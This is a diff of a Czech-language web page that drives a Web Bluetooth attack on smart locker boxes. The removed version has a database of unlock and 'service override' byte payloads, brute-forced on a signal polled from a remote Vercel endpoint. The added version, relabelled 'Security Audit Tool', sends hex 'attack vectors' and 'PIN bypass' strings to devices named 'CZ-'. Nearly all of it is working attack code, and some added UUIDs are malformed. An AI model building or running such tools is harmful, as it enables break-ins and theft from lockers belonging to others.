@@ -1,97 +1,86 @@
 <!DOCTYPE html>
-<html>
+<html lang="cs">
 <head>
-    <title>GHOST_V5.4_BRUTE_FORCE</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Audit Tool v2.0</title>
     <style>
-        body { background: black; color: #00FF00; font-family: monospace; padding: 20px; }
-        .log { border: 1px solid #00FF00; padding: 10px; height: 300px; overflow-y: auto; background: #050505; }
-        .status-ready { color: #00FF00; font-weight: bold; }
-        .status-active { color: #0088FF; font-weight: bold; }
-        .btn-main { background: #00FF00; color: black; border: none; padding: 15px; width: 100%; font-weight: bold; margin-top: 10px; }
+        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
+        .panel { border: 1px solid #00ff00; padding: 15px; border-radius: 5px; margin-bottom: 10px; }
+        button { background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 10px; margin: 5px; cursor: pointer; width: 100%; font-weight: bold; }
+        button:hover { background: #00ff00; color: #000; }
+        #log { background: #000; border: 1px solid #444; height: 250px; overflow-y: scroll; padding: 10px; font-size: 12px; color: #aaa; }
+        .status { color: #fff; font-weight: bold; margin-bottom: 10px; }
     </style>
 </head>
 <body>
-    <h2>GHOST_V5.4_BRUTE_FORCE</h2>
-    <div id="status" class="status-ready">STATUS: SYSTÉM PŘIPRAVEN</div>
-    <div id="log" class="log"></div>
-    <button class="btn-main" onclick="connectAndListen()">[1] AKTIVOVAT HLOUBKOVOU ANALÝZU & CLOUD SYNC</button>
+    <h1>SYSTEM AUDIT: CZ-LOKJ 🔱</h1>
+    
+    <div class="panel">
+        <div class="status" id="status">Stav: Odpojeno</div>
+        <button onclick="connect()">1. NAVÁZAT SPOJENÍ</button>
+    </div>
+
+    <div class="panel">
+        <strong>ATTACK VECTORS (HEX):</strong>
+        <button onclick="sendHex([0x01])">POVEL: 01 (START)</button>
+        <button onclick="sendHex([0x00])">POVEL: 00 (RESET)</button>
+        <button onclick="sendHex([0x01, 0x01])">POVEL: 01 01 (DOUBLE)</button>
+        <button onclick="sendHex([0xFF, 0xFF, 0xFF, 0xFF])">POVEL: FULL BURST (FF)</button>
+    </div>
+
+    <div class="panel">
+        <strong>PIN BYPASS (TEXT):</strong>
+        <input type="text" id="pinInput" placeholder="Zadej PIN (např. 123456)" style="width: 70%; padding: 5px;">
+        <button onclick="sendText()" style="width: 25%;">ODESLAT</button>
+    </div>
+
+    <div id="log">--- SYSTEM LOG READY ---<br></div>
 
     <script>
-        let device = null;
-        let characteristic = null;
-        const VERCEL_URL = "https://smart-locker-security-audit.vercel.app/api/bridge?deviceId=3c400ea8e35724d5";
+        let char;
+        const S_UUID = '00007a62-6f78-6573-2d6c-6f63-6b2d626c65';
+        const C_UUID = '00007a62-6f78-6573-2d6c-6f63-6b2d626c-31';
 
-        // Databáze útočných kódů (Payloads) pro různé typy boxů
-        const ATTACK_DATABASE = [
-            [0x55, 0x01, 0x01, 0x00, 0x00, 0x00, 0x01, 0x58], // Standard Unlock
-            [0x55, 0x07, 0x01, 0x01, 0x01, 0x01, 0x01, 0x5C], // Service Override
-            [0x05, 0x01, 0x06, 0x30, 0x30, 0x30, 0x30, 0x30], // Legacy Protocol
-            [0x55, 0x02, 0x01, 0x00, 0x01, 0x00, 0x01, 0x5A], // Alternate Pulse
-            [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]  // Reset Command
-        ];
-
-        function log(msg) {
+        async function log(m) {
             const l = document.getElementById('log');
-            l.innerHTML += `> ${msg}<br>`;
+            l.innerHTML += `> ${m}<br>`;
             l.scrollTop = l.scrollHeight;
         }
 
-        async function connectAndListen() {
+        async function connect() {
             try {
-                log("Hledám box v okolí...");
-                device = await navigator.bluetooth.requestDevice({
-                    acceptAllDevices: true,
-                    optionalServices: ['0000fee7-0000-1000-8000-00805f9b34fb']
+                log("Hledám CZ zařízení...");
+                const device = await navigator.bluetooth.requestDevice({
+                    filters: [{ namePrefix: 'CZ-' }],
+                    optionalServices: [S_UUID]
                 });
-                
                 const server = await device.gatt.connect();
-                log("PŘIPOJENO K BOXU. Vyhledávám kanál...");
-                
-                const service = await server.getPrimaryService('0000fee7-0000-1000-8000-00805f9b34fb');
-                const chars = await service.getCharacteristics();
-                characteristic = chars[0];
-
-                document.getElementById('status').innerText = "STATUS: CLOUD-LISTENER AKTIVNÍ";
-                document.getElementById('status').className = "status-active";
-                log("LISTENER AKTIVNÍ: ČEKÁM NA SIGNÁL Z TERMUXU...");
-
-                // Nekonečná smyčka - kontrola signálu z Vercelu každou vteřinu
-                setInterval(checkCloudTrigger, 1000);
-
-            } catch (e) {
-                log("CHYBA: " + e);
-            }
+                const service = await server.getPrimaryService(S_UUID);
+                char = await service.getCharacteristic(C_UUID);
+                document.getElementById('status').innerText = "Stav: PŘIPOJENO k " + device.name;
+                log("✅ Exploit kanál připraven.");
+            } catch (e) { log("❌ CHYBA: " + e); }
         }
 
-        async function checkCloudTrigger() {
+        async function sendHex(bytes) {
+            if(!char) return log("⚠️ Nejdřív se připoj!");
             try {
-                const response = await fetch(VERCEL_URL);
-                const data = await response.json();
-
-                if (data.action === "trigger_ble_unlock") {
-                    log("!!! SIGNÁL Z TERMUXU PŘIJAT !!!");
-                    await startBruteForceAttack();
-                    // Vymazání signálu po akci
-                    await fetch(VERCEL_URL, { method: 'POST', body: JSON.stringify({action: "clear"}) });
-                }
-            } catch (e) {}
+                log(`Odesílám HEX: ${bytes.map(b => b.toString(16)).join(' ')}`);
+                await char.writeValue(new Uint8Array(bytes));
+                log("✅ Paket doručen.");
+            } catch (e) { log("❌ Zamítnuto: " + e); }
         }
 
-        async function startBruteForceAttack() {
-            log("STARTUJI BRUTE-FORCE SEKVENCI...");
-            for (let i = 0; i < ATTACK_DATABASE.length; i++) {
-                try {
-                    const payload = new Uint8Array(ATTACK_DATABASE[i]);
-                    log(`INJEKCE PAYLOADU #${i+1}...`);
-                    await characteristic.writeValue(payload);
-                    log(`PAYLOAD #${i+1} -> POSLÁN [OK]`);
-                    // Krátká pauza mezi výstřely
-                    await new Promise(r => setTimeout(r, 200)); 
-                } catch (e) {
-                    log(`CHYBA U PAYLOADU #${i+1}: ` + e);
-                }
-            }
-            log("ÚTOK DOKONČEN. ZKONTROLUJ ZÁMEK.");
+        async function sendText() {
+            if(!char) return log("⚠️ Nejdřív se připoj!");
+            const val = document.getElementById('pinInput').value;
+            try {
+                log(`Zkouším PIN bypass: ${val}`);
+                let enc = new TextEncoder();
+                await char.writeValue(enc.encode(val));
+                log("✅ PIN paket odeslán.");
+            } catch (e) { log("❌ Chyba: " + e); }
         }
     </script>
 </body>
